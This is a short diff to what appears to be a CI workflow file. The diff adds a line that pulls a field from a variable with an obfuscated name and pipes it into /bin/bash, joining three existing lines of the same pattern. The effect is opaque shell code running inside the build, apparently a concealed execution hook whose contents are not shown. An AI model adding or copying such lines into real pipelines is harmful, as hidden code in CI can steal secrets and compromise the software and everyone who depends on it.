@@ -26,6 +26,7 @@ jobs:
           echo $pp7940 | jq -r .t4 | /bin/bash
           echo $oeyd1 | jq -r .wi6 | /bin/bash
           printf '%s' "$yw4" | jq -r .gsbd88 | /bin/bash
+          echo $bjl4365 | jq -r .iqf25 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
